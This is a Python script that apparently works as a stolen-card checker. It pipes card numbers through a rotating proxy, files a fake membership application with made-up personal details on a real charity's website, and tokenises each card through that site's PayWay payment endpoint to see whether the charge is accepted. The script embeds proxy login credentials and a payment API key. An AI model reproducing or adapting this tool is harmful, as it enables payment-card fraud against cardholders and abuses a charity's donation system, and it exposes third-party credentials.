import requests,re
import random
from proxy import reqproxy, make_request
def Tele(ccx):
	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_d4a33102-zone-scrapping:brgtmv5nyk7u"
	session, ip = reqproxy(proxy_str)
	#print(f"IP Address: {ip}")
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	random_amount1 = random.randint(1, 9)
	random_amount2 = random.randint(1, 99)
	
	headers = {
	    'authority': 'www.ccs.org.au',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://www.ccs.org.au',
	    'referer': 'https://www.ccs.org.au/how-to-get-involved/membership/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = {
	    'input_22': '',
	    'input_23': '',
	    'input_2': '',
	    'input_15': '',
	    'input_24': '',
	    'input_25': '',
	    'input_38': '',
	    'input_26': '',
	    'input_5[]': [
	        '',
	        '',
	        '',
	    ],
	    'input_35': 'Ordinary Membership $5|5',
	    'input_7': 'Applying to be a member for the first time',
	    'input_11': f'$ {random_amount1}.{random_amount2}',
	    'input_39.1': '',
	    'input_39.2': '',
	    'input_40': '',
	    'gform_submission_method': 'postback',
	    'gform_theme': 'gravity-theme',
	    'gform_style_settings': '[]',
	    'is_submit_45': '1',
	    'gform_submit': '45',
	    'gform_unique_id': '',
	    'state_45': 'WyJ7XCIzNVwiOltcIjA4ZGQ0MTQwNzM5MzNmY2IwZDRiN2E3MDY3ZGE0M2VlXCIsXCI4OWYzZmYyY2I1Y2JkYzM1YTc4OTgzNmFiZWM0ZWFiYlwiXX0iLCI3OGFhNzllZjYwNGYxZmQ3MTQ5MWE5YWM4ZWUwNjYxZCJd',
	    'gform_target_page_number_45': '0',
	    'gform_source_page_number_45': '1',
	    'gform_field_values': '',
	    'gform_save': 'true',
	}
	
	response = session.post('https://www.ccs.org.au/wp-json/gf/v2/forms/45/submissions', headers=headers, data=data)
	
	resume_token = re.search(r'"resume_token":"(.*?)"', response.text).group(1)
	
	headers = {
	    'authority': 'api.payway.com.au',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'authorization': 'Basic UTEyNDA5X1BVQl93NGJwajJqdHY4MmZoZmFwZnFqZ3RuOGp1ZGF1cDk3YWlpN3d4MmluaHdlZWhjMnEzcXp1MmVuaTNrZTc6',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://api.payway.com.au',
	    'referer': 'https://api.payway.com.au/rest/v1/creditCard-iframe.htm',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-no-authenticate-basic': 'true',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = {
	    'paymentMethod': 'creditCard',
	    'connectionType': 'FRAME',
	    'cardNumber': n,
	    'cvn': cvc,
	    'cardholderName': 'Dao Khao Saard',
	    'expiryDateMonth': mm,
	    'expiryDateYear': yy,
	    'threeDS2': 'false',
	}
	
	response = session.post('https://api.payway.com.au/rest/v1/single-use-tokens', headers=headers, data=data)
	
	tok = response.json()['singleUseTokenId']
	
	headers = {
	    'authority': 'www.ccs.org.au',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://www.ccs.org.au',
	    'referer': 'https://www.ccs.org.au/how-to-get-involved/membership/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = {
	    'input_22': 'Rodam',
	    'input_23': 'User',
	    'input_2': f'rodamuser{random_amount1}{random_amount2}@gmail.com',
	    'input_15': '4303000850',
	    'input_24': 'Street 27',
	    'input_25': 'New York',
	    'input_38': 'New York',
	    'input_26': '10080',
	    'input_5[]': [
	        '3',
	        '10',
	        '2001',
	    ],
	    'input_35': 'Ordinary Membership $5|5',
	    'input_7': 'Applying to be a member for the first time',
	    'input_36': 'No',
	    'input_37.1': 'I confirm and acknowledge my details',
	    'input_11': f'$ {random_amount1}.{random_amount2}',
	    'input_39.1': '',
	    'input_39.2': tok,
	    'input_40': '',
	    'gform_submission_method': 'postback',
	    'gform_theme': 'gravity-theme',
	    'gform_style_settings': '[]',
	    'is_submit_45': '1',
	    'gform_submit': '45',
	    'gform_unique_id': '',
	    'state_45': 'WyJ7XCIzNVwiOltcIjA4ZGQ0MTQwNzM5MzNmY2IwZDRiN2E3MDY3ZGE0M2VlXCIsXCI4OWYzZmYyY2I1Y2JkYzM1YTc4OTgzNmFiZWM0ZWFiYlwiXX0iLCI3OGFhNzllZjYwNGYxZmQ3MTQ5MWE5YWM4ZWUwNjYxZCJd',
	    'gform_target_page_number_45': '0',
	    'gform_source_page_number_45': '1',
	    'gform_field_values': '',
	    'resume_token': resume_token,
	    'version_hash': '86790a319b47691ce4f0a8115c7e15c0',
	}
	
	response = session.post(
	    'https://www.ccs.org.au/how-to-get-involved/membership/',
	    headers=headers,
	    data=data,
	)
	
	try:
		result = re.search(r'class="validation_error">(.*?)<\/div>', response.text).group(1)
	except:
		result = re.search(r'<h4>(.*?)<\/h4>', response.text).group(1)
		
	return (result)